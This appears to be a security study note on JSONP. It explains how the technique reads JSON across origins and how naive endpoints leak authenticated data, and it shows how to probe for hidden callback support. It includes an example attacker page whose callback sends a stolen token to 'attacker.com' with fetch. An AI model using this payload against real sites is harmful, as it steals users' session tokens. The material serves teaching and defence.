>[!info] Pre-requisites:
>- [Cross-origin resource sharing (CORS)](Cross-origin%20resource%20sharing%20(CORS).md)
>- [Same-origin policy (SOP)](Same-origin%20policy%20(SOP).md)

# JSON with Padding (JSONP)

>[!question] What is JSONP?
>Is a historical [JavaScript](../Dev,%20scripting%20&%20OS/JavaScript%20&%20NodeJS.md) technique for requesting JSON data by loading a `<script>` element, enabling sharing of data across domains **bypassing** the [Same-origin policy (SOP)](Same-origin%20policy%20(SOP).md)

By default, the same origin policy prevents reading JSON cross site. JSONP is a little bit of a hack: it wraps JSON data in a JavaScript function call (previously defined in the original site). This makes it possible to read the JSON cross-site, by including the JSONP resource as a script.

JSON data to read: 
```json
{"name":"0xbro"}
```

JSONP data: 
```json
somefunction({"name":"0xbro"})
```

Reading the JSON cross site is possible by doing `<script src="https://my.webapp/data.jsonp">` where `somefunction` has already been defined in the source code:

```html
<script> 
	function somefunction(data) { 
		// The data variable will contain the JSON data. 
	}
</script>
<script src="https://my.webapp/data.jsonp">
```

Sometimes it is used a more dynamic approach, where the application requesting the data provides a parameter (usually `callback`) used to create the JSONP data:
```html
<script> 
	function parseResponse(data) { 
		// The data variable will contain the JSON data. 
	}
</script>
<script src="https://my.webapp/data?callback=parseResponse">

// JSONP result
parseResponse({"Name": "Clem", "Id": 1234, "Rank": 7});
```
# JSONP vulnerabilities

JSONP makes it possible to access data from another website in a [Cross-Site Request Forgery (CSRF)](Cross-Site%20Request%20Forgery%20(CSRF).md)-like style attack:
1. The attacker’s site includes the JSONP URL as a script. 
2. The browser performs the request, and sends cookies along if the user is authenticated. 
3. The JSONP will return the data for the authenticated user, and the attacker’s site can read that.

## Cross-site Request Forgery & Data Leakage

Naive deployments of JSONP are subject to [Cross-Site Request Forgery (CSRF)](Cross-Site%20Request%20Forgery%20(CSRF).md) attacks. Because the HTML `<script>` element does not respect the [Same-origin policy (SOP)](Same-origin%20policy%20(SOP).md) in web browser implementations, a malicious page can request and obtain JSON data belonging to another site. This will allow the JSON-encoded data to be evaluated in the context of the malicious page, possibly divulging passwords or other sensitive data if the user is currently logged into the other site.

Application JSONP endpoint:
```http
GET /api/getUserToken HTTP/1.1
Cookie: sessid=asd

get({"token":"supersecret-token"})
```

Malicious page redirecting user traffic to the JSONP endpoint and extracting the corresponding data:

```html
<script>
function get(data){
	fetch('https://attacker.com/?data='+JSON.stringify(data);
}
</script>
<script src='https://vulnerable.com/api/getUserToken'></script>
```

Other similar attacks and bypasses can be found below:
- Object method call
- Content-Type and X-Content-Type-Options bypass

```cardlink
url: https://securitycafe.ro/2017/01/18/practical-jsonp-injection/
title: "Practical JSONP Injection"
description: "JSONP injection is a lesser known but quite widespread and dangerous vulnerability and it surfaced in the last years due to the high rate of adoption of JSON, web APIs and the urging need for cross…"
host: securitycafe.ro
favicon: https://secure.gravatar.com/blavatar/c798a440ec703a17d8eda6a25b9dac06fa8162164e7e563dbc832069a934ce2b?s=32
image: https://kpmgsecurity.files.wordpress.com/2017/01/specified-callback-code.png
```

## Untrusted third-party code

Including script elements from remote servers allows the remote servers to inject _any_ content into a website. If the remote servers have vulnerabilities that allow JavaScript injection, the page served from the original server is exposed to an increased risk. If an attacker can inject any JavaScript into the original web page, then that code can retrieve additional JavaScript from any domain [^3rd-party]

[^3rd-party]: [Untrusted third-party code](https://en.wikipedia.org/wiki/JSONP#:~:text=%5Bedit%5D-,Untrusted%20third%2Dparty%20code,-%5Bedit%5D), wikipedia.org

## Callback name manipulation and reflected file download attack


# Detect hidden attack surface

Sometimes, JSONP is not used by the site but the API still supports it. To check an endpoint for JSONP support, try this:

- Add a callback parameter to a JSON URL, by appending `?callback=something` to the URL.
- When a format type is provided, change it to JSONP. Change `?format=json` to `?format=jsonp`

>[!example]
> Original site: https://demo.sjoerdlangkemper.nl/jsonp.php
>
>```json
{"hello":"world","number":8024046285436083725,"token":"4db7c9cc0bb2c73e10f543180dae83fd65fb4569b1a3cd9df62c1a33dfc72f75"}
>```
>Hidden supported parameters: https://demo.sjoerdlangkemper.nl/jsonp.php?format=jsonp&callback=pwned
>```json
>pwned({"hello":"world","number":2969561363119907216,"token":"4db7c9cc0bb2c73e10f543180dae83fd65fb4569b1a3cd9df62c1a33dfc72f75"})
>```

